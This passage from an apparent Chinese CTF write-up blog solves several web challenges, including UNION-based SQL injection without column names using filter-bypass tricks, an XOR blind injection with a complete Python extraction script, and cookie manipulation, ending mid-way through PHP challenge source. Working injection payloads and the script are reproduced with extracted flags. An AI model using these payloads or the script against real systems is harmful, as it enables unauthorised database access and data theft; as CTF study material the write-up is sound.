<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token identifier"><span class="token punctuation">`</span>2<span class="token punctuation">`</span></span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>a
<span class="token keyword">select</span> a<span class="token punctuation">.</span><span class="token number">2</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>a
<span class="token comment">#记得第一个2加反引号,或者使用a.2</span>
如果反引号<span class="token identifier"><span class="token punctuation">`</span><span class="token punctuation">`</span></span>被过滤<span class="token punctuation">,</span>可以使用为字段起别名的方式<span class="token punctuation">.</span>
<span class="token keyword">select</span> <span class="token identifier"><span class="token punctuation">`</span>2<span class="token punctuation">`</span></span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span> <span class="token keyword">as</span> xxx

<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>x<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>x<span class="token punctuation">;</span>

第一个查询
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span>
该查询的功能是从 <span class="token keyword">user</span> 表中选取 id 等于 <span class="token operator">-</span><span class="token number">1</span> 的所有行。
一般而言，id 属于主键或者唯一键，通常不会存在 id 为 <span class="token operator">-</span><span class="token number">1</span> 的行，所以这个查询可能不会返回任何结果。不过，它的目的是要保证和第二个查询的列数一致。

第二个查询
<span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> group_concat<span class="token punctuation">(</span>x<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>x
这个查询较为复杂，下面逐步拆解：
子查询
<span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>x
子查询的功能是把两个查询结果合并。
第一个查询 <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c 会生成一行数据，这一行有三个列，分别命名为 a、b、c，它们的值依次为 <span class="token number">1</span>、<span class="token number">2</span>、<span class="token number">3</span>。
第二个查询 <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users 会从 users 表中选取所有行。
这两个查询的结果通过 <span class="token keyword">UNION</span> 合并成一个临时结果集，并且给这个临时结果集起了别名 x。

外层查询
<span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> group_concat<span class="token punctuation">(</span>x<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>x
外层查询从临时结果集 x 里选取数据。
前两列的值分别为常量 <span class="token number">1</span> 和 <span class="token number">2</span>。
第三列运用了 GROUP_CONCAT 函数，该函数的作用是把 x 表中 c 列的所有值连接成一个字符串，默认情况下，这些值会用逗号分隔。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但首先不知道列数，order还被ban了。。。不知道只能慢慢select了</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,2,3'</span>
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8dddfbbccf96e390c83fc2d112b8cf98.png"></p>
<p><del>嗯，总之就当我发了22次广告吧（</del></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/199fce82d5660ff4a41a2a611fbe68c8.png"></p>
<p>搞2！</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'</span>
<span class="token comment">#web1</span>
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'select `2` from (select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 union select * from web1)'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>but<img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ae864d3a7c4fa6df2981d8bc66e96eaf.png"></p>
<p>但InnoDb引擎可</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'select `2` from (select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 union select * from web1)'</span>
<span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span>innodb_table_stats <span class="token keyword">where</span> database_name<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
得
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from mysql.innodb_table_stats where database_name="web1"'</span>
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name="web1"'</span>
<span class="token comment">#懒得转义我这里手动加的双引号hhh</span>
<span class="token comment">#ads,users</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>x<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>x<span class="token punctuation">;</span>
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'select `2` from (select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 union select * from web1)'</span>
得
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,database(),(select group_concat(x.c) from (select (select 1)a,(select 2)b,(select 3)c union select * from ads)x),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'</span>

先试了ads:
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'union/**/select/**/1,database(),(select/**/group_concat(x.e)/**/from/**/(select/**/(select/**/1)a,(select/**/2)b,(select/**/3)c,(select/**/4)d,(select/**/5)e/**/union/**/select/**/*/**/from/**/users)x),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'</span>
仍是<span class="token comment">#The used SELECT statements have a different number of columns</span>
我试到f结果发现溢出了。。。于是试<span class="token keyword">user</span>
users表的列数正好是<span class="token number">3</span>
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,database(),(select group_concat(x.c) from (select (select 1)a,(select 2)b,(select 3)c union select * from users)x),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'</span>
<span class="token comment">#flag{ecbdd94b-681f-4293-9835-9cb932a63393}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后放下payoad: <code>-1'union/**/select/**/1,database(),(select/**/group_concat(x.c)/**/from/**/(select/**/(select/**/1)a,(select/**/2)b,(select/**/3)c/**/union/**/select/**/*/**/from/**/users)x),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'</code>哦耶耶~</p>
<hr>
<h3 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h3><!--Log in as `admin`!-->

<!--We found the account cookie/monster-->

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/891c03279de5d67cbb68e7d0456240c5.png"></p>
<p>啊哈？</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/340c116a5c4220871a5b0b3e8410e63a.png"></p>
<p>这也太💦了</p>
<hr>
<h3 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h3><p>盲注+python，也是拉满buff了</p>
<p>2：<del>一拳一个嘤嘤怪</del></p>
<p>3：<del>满屏红字吓死人了（</del></p>
<p>5：谢谢涨词了navienavienavie天真的天真的天真的</p>
<p>这是过滤了啥，咋有的可有的不可？</p>
<p>buer，这username也太哈人了吧，说这是白名单也不为过（</p>
<p>然后想到让找第六个，那说明好像是要搞id（bushi)咳咳</p>
<pre class="line-numbers language-none"><code class="language-none">Clever! But not this table.翻译
=&gt;真聪明！但不是这个表。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>fuzz了一下，空格和注释符还有一些关键词被ban了，发现’or’=’or’或TRUE会返回id=1时的页面：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/SoporAeternus12/article/details/124001820">sql注入漏洞之异或注入_sql异或注入-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/vincy99/p/9642956.html">SQL注入学习总结(八):其他SQL注入的异或注入 - 哈哈哈1014 - 博客园</a></p>
<p>判断不了列数，我就直接搞了</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">0</span><span class="token operator">^</span><span class="token number">1</span><span class="token comment">--&gt;ture</span>
?id<span class="token operator">=</span><span class="token number">0</span><span class="token operator">^</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">--&gt;error</span>
?id<span class="token operator">=</span><span class="token number">0</span><span class="token operator">^</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token comment">--&gt;ture</span>

下面为脚本内容：
<span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span>
<span class="token comment">#information_schema,performance_schema,test,mysql,geek</span>

<span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_schema<span class="token operator">=</span><span class="token string">'geek'</span><span class="token punctuation">)</span>
<span class="token comment">#F1naI1y,Flaaaaag</span>

<span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_name<span class="token operator">=</span><span class="token string">'Flaaaaag'</span><span class="token punctuation">)</span>
<span class="token comment">#id,fl4gawsl</span>

<span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_name<span class="token operator">=</span><span class="token string">'F1naI1y'</span><span class="token punctuation">)</span>
<span class="token comment">#id,username,password</span>

<span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>fl4gawsl<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>Flaaaaag<span class="token punctuation">)</span>
<span class="token comment">#NO! Not this! Click others~~~,yingyingying~ Not this as well~~,Ohhh You find the flag read on!&lt;br/&gt;Ohhh You #find the flag read on!&lt;br/&gt;Ohhh You find the flag(然后是循环)</span>

<span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>F1naI1y<span class="token punctuation">)</span>
<span class="token comment">#mygod,welcome,site,site,site,site（碎碎念：那很site了）,Syc,finally,flag  </span>

<span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>F1naI1y<span class="token punctuation">)</span>
<span class="token comment">#cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http:#//www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag{7cf79887-48e3-42a4-ae01-17a0cb33c188}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote_plus

<span class="token comment"># 配置目标信息</span>
target_url <span class="token operator">=</span> <span class="token string">"http://75388fa0-b0c7-4fc1-b201-295652d9481b.node5.buuoj.cn:81/search.php"</span>  <span class="token comment"># 目标URL</span>
param_name <span class="token operator">=</span> <span class="token string">"id"</span>  <span class="token comment"># 存在注入的参数名</span>
true_keyword <span class="token operator">=</span> <span class="token string">"NO! Not this! Click others~~~"</span>  <span class="token comment"># 条件为真时的页面特征</span>
max_length <span class="token operator">=</span> <span class="token number">500</span>  <span class="token comment"># 最大猜测长度</span>


<span class="token keyword">def</span> <span class="token function">check_condition</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    发送请求并检查条件是否成立
    :param payload: SQL条件语句（不带闭合）
    :return: 布尔值，表示条件是否成立
    """</span>
    <span class="token comment"># 构造完整Payload并编码</span>
    full_payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"0^</span><span class="token interpolation"><span class="token punctuation">{</span>payload<span class="token punctuation">}</span></span><span class="token string"> "</span></span>
    <span class="token comment">#使用 f - 字符串可以直接在字符串中插入变量的值，相比于传统的字符串格式化方法（如 % 格式化或 str.format() 方法）</span>
    encoded_payload <span class="token operator">=</span> quote_plus<span class="token punctuation">(</span>full_payload<span class="token punctuation">)</span>  <span class="token comment"># URL 编码</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>
            <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>target_url<span class="token punctuation">}</span></span><span class="token string">?</span><span class="token interpolation"><span class="token punctuation">{</span>param_name<span class="token punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token punctuation">{</span>encoded_payload<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>
            timeout<span class="token operator">=</span><span class="token number">5</span>
        <span class="token punctuation">)</span>
        <span class="token keyword">return</span> true_keyword <span class="token keyword">in</span> response<span class="token punctuation">.</span>text
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] 请求失败: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>


<span class="token keyword">def</span> <span class="token function">extract_data</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    使用二分法逐字符提取数据
    :param query: SQL查询语句
    :return: 提取的字符串
    """</span>
    result <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> pos <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> max_length<span class="token punctuation">)</span><span class="token punctuation">:</span>
        low<span class="token punctuation">,</span> high <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">126</span>
        <span class="token keyword">while</span> low <span class="token operator">&lt;=</span> high<span class="token punctuation">:</span>
            mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
            condition <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"((ascii(substr(</span><span class="token interpolation"><span class="token punctuation">{</span>query<span class="token punctuation">}</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">{</span>pos<span class="token punctuation">}</span></span><span class="token string">,1)))&gt;</span><span class="token interpolation"><span class="token punctuation">{</span>mid<span class="token punctuation">}</span></span><span class="token string">)"</span></span>
            <span class="token keyword">if</span> check_condition<span class="token punctuation">(</span>condition<span class="token punctuation">)</span><span class="token punctuation">:</span>
                low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                high <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>
        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>high<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token comment">#当 check_condition 返回 False 时，high 会被更新为 mid - 1。所以，目标字符的 ASCII 码实际上就是 high + 1。</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] 当前进度: </span><span class="token interpolation"><span class="token punctuation">{</span>result<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> result


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token comment">#print("[+] 正在提取数据库名称...")</span>
    <span class="token comment">#db_name = extract_data("(select(group_concat(schema_name))from(information_schema.schemata)")</span>
    <span class="token comment">#print(f"[+] 数据库名称: {db_name}")</span>
    <span class="token comment">#information_schema,performance_schema,test,mysql,geek</span>

    <span class="token comment">#table_name = extract_data("(select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')")</span>
    <span class="token comment">#print(f"[+] 表名称: {table_name}")</span>
    <span class="token comment">#F1naI1y,Flaaaaag</span>

    <span class="token comment">#column_name = extract_data("(select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')")</span>
    <span class="token comment">#print(f"[+] 列名称: {column_name}")</span>
    <span class="token comment">#id,fl4gawsl</span>

    flag <span class="token operator">=</span> extract_data<span class="token punctuation">(</span><span class="token string">"(select(group_concat(id))from(F1naI1y)"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 内容: </span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token comment">#cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag{7cf79887-48e3-42a4-ae01-17a0cb33c188}</span>

<span class="token comment"># -*- coding: UTF-8 -*- #</span>
<span class="token triple-quoted-string string">"""
@filename:final SQL.py
@auther:qing
@time:2025-3-31
"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>值得注意的是，我在编写脚本时，在设置<code>low, high = 32, 126</code>时一开始范围是从0到200（想着无所谓），但这样爆出的结果会有乱码，因此还是设置在正常范围内吧。</p>
<hr>
<h3 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h3><p>这题真无敌了吧，我打算复制去Bing一下，结果直接自动翻译了。</p>
<pre class="line-numbers language-none"><code class="language-none">Resistance is futile! Bring back Futurella or we'll invade!  Also, the flag is flag{94accd60-8f06-4be2-8852-5bda9d9a0283}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>可能就是style.css在作祟</p>
</blockquote>
<hr>
<h3 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token comment">//例子 c=20-1</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"太长了不会算"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
